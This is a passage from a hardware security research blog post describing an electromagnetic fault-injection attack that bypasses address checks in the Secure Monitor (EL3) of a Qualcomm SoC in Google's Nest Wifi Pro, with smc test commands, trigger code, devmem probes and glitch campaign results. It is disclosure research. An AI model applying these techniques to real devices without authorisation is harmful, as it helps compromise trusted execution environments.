<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-plain" data-lang="plain"><span style="display:flex;"><span>/ # insmod send_t.ko _smcid=0x2000502 _para1=0x193D100 _para2=0x41414141 &amp;&amp; rmmod send_t.ko
</span></span><span style="display:flex;"><span>[  333.658447] smc (init)!
</span></span><span style="display:flex;"><span>[  333.658467] 00000000 00000000 0193d100 41414141 00000000 00000000
</span></span><span style="display:flex;"><span>[  333.663441] smc (exit)!
</span></span></code></pre></div><p>When we use the <code>io_access_write</code> command to write to an address that&rsquo;s not allowed, the write is masked (i.e., not performed).</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-plain" data-lang="plain"><span style="display:flex;"><span>/ # insmod send_t.ko _smcid=0x2000502 _para1=0x4ac00000 _para2=0x41414141 &amp;&amp; rmmod send_t.ko
</span></span><span style="display:flex;"><span>[  123.648446] smc (init)!
</span></span><span style="display:flex;"><span>[  123.648466] 00000000 00000000 4ac00000 41414141 00000000 00000000
</span></span><span style="display:flex;"><span>[  123.653431] smc (exit)!
</span></span></code></pre></div><p>For <code>io_access_read</code> there is a clear difference in the output between reading an allowed address and a non-allowed address. This is in line with our expectations, as the read performed on a non-allowed address always returns zeroes.</p>
<p>In the case of <code>io_access_write</code>, instead, there is no difference in the returned value between an allowed and non-allowed address, besides, of course, the write itself being committed. Therefore, reading out the target address after a glitch attempt is required in order to confirm whether the glitch has been successful and the write has actually been performed.</p>
<h2 id="attack-timing">Attack timing</h2>
<hr>
<p>To time the attack, we use the same <code>GPIO</code> signal as during the characterization (i.e., factory reset button). We set it high just before issuing the <code>smc</code> instruction and low after it&rsquo;s finished (i.e., it returns from EL3). This allows us to reliably time our glitches.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span>...
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">asm</span> <span style="color:#66d9ef">volatile</span>(
</span></span><span style="display:flex;"><span>    ...
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;mov r9, #3;str r9, [r8];&#34;</span> <span style="color:#75715e">// trigger on
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#e6db74">&#34;.arch_extension sec</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;smc    #0      @ switch to secure world</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;mov r9, #0;str r9, [r8];&#34;</span> <span style="color:#75715e">// trigger off
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    ...
</span></span><span style="display:flex;"><span>);
</span></span><span style="display:flex;"><span>...
</span></span></code></pre></div><p>We define the attack window, in which our target code construction is executed, by measuring the trigger up and down moments using an oscilloscope. It&rsquo;s guaranteed to be executed within this window as the trigger goes up before the <code>smc</code> instruction and down after it returns. We randomize the timing within this window as we do not exactly know when the check we are targeting is being performed.</p>
<p style="text-align:center;">
    <img src="/img/google/wifipro/emfi/timing_io_read_valid.png" style="max-width: 80%; width: 600px">
    <figcaption>Reading an allowed address</figcaption>
</p>
<p>Several overlapping traces are shown below, making visible that some jitter is present (~300 ns), which means not all operations take the same amount of time. Hence, the operations within this window will not happen at the same time. This is likely caused by the context switch required between the REE and the TEE, but other events may introduce jitter as well.</p>
<p style="text-align:center;">
    <img src="/img/google/wifipro/emfi/timing_io_read_invalid.png" style="max-width: 80%; width: 600px">
    <figcaption>Reading a non-allowed address</figcaption>
</p>
<p>We observe that when reading a non-allowed address, the time required for the operation to complete is slightly shorter. This is visible in the values for cursor 1 and 2. There is jitter for both reading an allowed address and an address that&rsquo;s not allowed.</p>
<p>As the attack window is fairly small, in the order of a few microseconds, we decided to target the entire attack window during our testing. This means we simply randomly inject glitches with varying strength between the moment the goes up and the trigger goes down.</p>
<h2 id="arbitrary-read-using-io_access_read">Arbitrary read using io_access_read</h2>
<hr>
<p>We tried first to bypass the <code>is_allowed_address()</code> check for <code>io_access_read</code> as this would be easier to confirm. When we are successful, the value stored at a non-allowed address is simply returned. We decided to target address <code>0x4ac00000</code> as this address is the first instruction of the Secure Monitor (EL3). It&rsquo;s fair to assume this address can be read by the Secure Monitor (EL3) as it can be executed. Note, this may not always hold up, e.g., when EXecute Only Memory (XOM)<a href="https://source.android.com/docs/security/test/execute-only-memory">*</a> is used. However, as code is mixed with data, we are confident it&rsquo;s not used for the Secure Monitor (EL3).</p>
<p>On the other hand, the address <code>0x4ac00000</code> should certainly not be readable from the REE, as it belongs to secure memory. Still, we can obtain the value stored at its location (shown below) via reverse engineering of the Secure Monitor (EL3).</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-plain" data-lang="plain"><span style="display:flex;"><span>entry:
</span></span><span style="display:flex;"><span>    4ac00000    e1 ff 9f d2     mov x1, #0xffff
</span></span><span style="display:flex;"><span>    4ac00004    21 bc 70 d3     lsl x1, x1, #0x10
</span></span><span style="display:flex;"><span>    4ac00008    21 3c 40 b2     orr x1, x1, #0xffff
</span></span><span style="display:flex;"><span>    ...
</span></span></code></pre></div><p>To clarify, when we are successful in bypassing the check performed by <code>is_allowed_address()</code>, the value <code>0xd29fffe1</code> should be returned by the <code>smc</code> call instead of <code>0x00000000</code>.</p>
<p>We started an overnight campaign of about <code>150,000</code> experiments, during which we observed our first successful glitches. As always, we plot the experiments using our <a href="https://github.com/raelize/TAoFI-Analyzer">TAoFI-Analyzer</a>, for which the results are shown below.</p>
<p style="text-align:center;">
    <img src="/img/google/wifipro/emfi/501_overnight.png" style="max-width: 80%; width: 600px">
    <figcaption>Overnight campaign: attempt reading from 0x4ac00000</figcaption>
</p>
<p>We observed <code>5</code> successful glitches in a region between roughly <code>3,500</code> ns and <code>4,000</code> ns, resulting in a success rate of nearly 0%. As the campaign lasted <code>524</code> minutes, we averaged a speed of <code>1</code> successful glitch per <code>104.8</code> minutes.</p>
<p>As is visible in the above image, there are three (3) moments in time where we are successful, namely ~1 Î¼s, 3.8 Î¼s and 4.8 Î¼s. For each moment in time, the successful glitches are spread across a ~300 ns region, which matches with the jitter observed in the trigger signal.</p>
<p>The three different moments in time could potentially be explained by the hypothesis that we are affecting three (3) different code constructions. However, as the moments in time are at significant different moments in time, we do not know if this hypothesis is true. We assume the successful glitches around 3.8 Î¼s are targeting the intended code construction.</p>
<p>To increase the success rate, we adjust the glitch parameters to that of the successful glitches around 3.8 Î¼s, as it yielded most successful glitches. The plot below contains <code>5,000</code> experiments, which took 50 minutes to perform, averaging a speed of <code>1.66</code> experiment per second.</p>
<p style="text-align:center;">
    <img src="/img/google/wifipro/emfi/501_narrow.png" style="max-width: 80%; width: 600px">
    <figcaption>Focused campaign: reading 0x4ac00000</figcaption>
</p>
<p>During this campaign we observed <code>4</code> successful glitches, which yields a success rate of <code>0.1%</code> and one successful glitch every <code>12.5</code> minutes in average. This means we are able to read a 32-bit value, from an arbitrary address, with the privileges the <code>Secure Monitor</code>, on average, once every <code>12.5</code> minutes.</p>
<h2 id="arbitrary-write-using-io_access_write">Arbitrary write using io_access_write</h2>
<hr>
<p>We assumed that the Secure Monitor (EL3) cannot overwrite its own code due to the MMU configuration. Hence, we decided not to use <code>0x4ac00000</code> as the address to write to, as we assumed this would simply fail. We settled for an address we deemed accessible from the Secure Monitor (EL3) as well as from REE (e.g., a hardware register). This allows us to verify if we are successful from REE just by using the <code>devmem</code> command. This commands is able to map physical memory in Linux user space using the <code>/dev/mem</code> file.</p>
<p>After a bit of probing the hardware registers of Qualcomm&rsquo;s IPQ5018 SoC, along with reversing the Secure Monitor (EL3), we decided to use the address <code>0x1814000</code>. We don&rsquo;t know exactly what this hardware register is used for, but we were confident this could be accessed by the Secure Monitor (EL3).</p>
<p>We confirmed the REE can access it using <code>devmem</code>:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-plain" data-lang="plain"><span style="display:flex;"><span>/ # devmem 0x1814000 32 0x41414141
</span></span><span style="display:flex;"><span>/ # devmem 0x1814000 32
</span></span><span style="display:flex;"><span>0x01414141
</span></span><span style="display:flex;"><span>/ #
</span></span></code></pre></div><p>Note, the most significant nibble cannot be written, hence it&rsquo;s <code>0</code>. This is just a characteristic of this hardware register and not so important for identifying the attack.</p>
<p>We used the same glitch parameters as during the narrowed campaign of <code>io_access_read</code>, again with <code>5,000</code> experiments in about <code>50</code> minutes. The related plot is shown below.</p>
<p style="text-align:center;">
    <img src="/img/google/wifipro/emfi/502_narrow.png" style="max-width: 80%; width: 600px">
    <figcaption>Focused campaign reading 0x4ac00000</figcaption>
</p>
<p>In total, for this campaign, we observed <code>5</code> successful glitches, where the register <code>0x1814000</code> was set to <code>0x01414141</code>. This results in a success rate of 0.1% and one successful glitch every 10 minutes. This means we are able to write a 32-bit value to an arbitrary address, with the privileges the <code>Secure Monitor</code>, on average, once every 10 minutes.</p>
<h2 id="conclusion">Conclusion</h2>
<hr>
<p>After successfully determining Qualcomm&rsquo;s IPQ5018 SoC is vulnerable to EM glitches (see <a href="/blog/google-wifi-pro-glitching-from-root-to-el3-part-1-characterization/">part 1</a>), we successfully performed an attack on the Secure Monitor (EL3). We altered the intended behavior of functionality present in the Secure Monitor (EL3) using an EM glitch, which yielded us an arbitrary 32-bit RW primitive.</p>
<p>Even though the success rate is fairly low, we are able to successfully read from, or write to, multiple values within a hour. We are confident the success rate could be improved as we did not fully explore all the relevant variables that may determine it. This includes:</p>
<ul>
<li>Different locations</li>
<li>Different EM probe tips</li>
<li>Different method timing (e.g., using power consumption instead of GPIO trigger)</li>
</ul>
<p>Note, it&rsquo;s likely infeasible to read or write more values during a single boot as the success rate is simply too low and resets are frequent. Hence, the RW primitive that we obtained may seem not that powerful. However, in the next post we will demonstrate that this RW primitive can be used to fully compromise the TEE on Google&rsquo;s Nest Wifi Pro.</p>
<h2 id="ending">Ending</h2>
<hr>
<p>Feel free to reach out for questions or remarks related to this research. As always, we are available to give training on the research we perform, during which you will gain hands-on experience exploiting the vulnerabilities described in this blog post.</p>
<p>- Raelize<span style="color:yellow">.</span></p>
</div>
                

                
                
            </div>
        </div>
    </div>
</section>


  </div><!-- end Contact Area -->
<footer id="footer" class="section-bg">
	<div class="container">
		<div class="row wow fadeInUp" data-wow-duration="500ms">
			<div class="col-xl-12">

				<!-- Footer Social Links -->
				<div class="social-icon">
					<ul class="list-inline">
						
						<li class="list-inline-item"><a href="https://twitter.com/raelizecom" rel="nofollow"><i class="ti-twitter-alt"></i></a></li>
						
						<li class="list-inline-item"><a href="https://www.linkedin.com/company/raelize" rel="nofollow"><i class="ti-linkedin"></i></a></li>
						
					</ul>
				</div>

				<!-- copyright -->
				<div class="copyright text-center">
					<a href="https://raelize.com/">
						<img src="https://raelize.com/images/logo.png" alt="Raelize - Embedded Device Security Services Consultancy Testing Research Training" height="42" />
					</a>
					<br>
					<p>Copyright Â©2020 Raelize B.V. <br> Powered by <a href=#>Hugo</a> and <a href="https://themefisher.com">Themefisher</a>.</p>
				</div>
			</div>
		</div>
	</div>
</footer>
<!-- /footer -->

<!-- Google Map API -->


<!-- JS Plugins -->

<script src="https://raelize.com/plugins/jquery/jquery.min.js"></script>

<script src="https://raelize.com/plugins/bootstrap/bootstrap.min.js"></script>

<script src="https://raelize.com/plugins/slick/slick.min.js"></script>

<script src="https://raelize.com/plugins/shuffle/shuffle.min.js"></script>

<script src="https://raelize.com/plugins/magnific-popup/jquery.magnific-popup.min.js"></script>

<script src="https://raelize.com/plugins/lazy-load/lozad.min.js"></script>

<script src="https://raelize.com/plugins/google-map/map.js"></script>


<!-- Main Script -->

<script src="https://raelize.com/js/script.min.30c5d71cc6d4427af95614c557ab5b3e327ad2aa865d9c4cb3e3af601bd051948abde36c96cad1b4cb71909318d0e18c.js" integrity="sha384-MMXXHMbUQnr5VhTFV6tbPjJ60qqGXZxMs&#43;OvYBvQUZSKveNslsrRtMtxkJMY0OGM"></script>


</body>

</html>
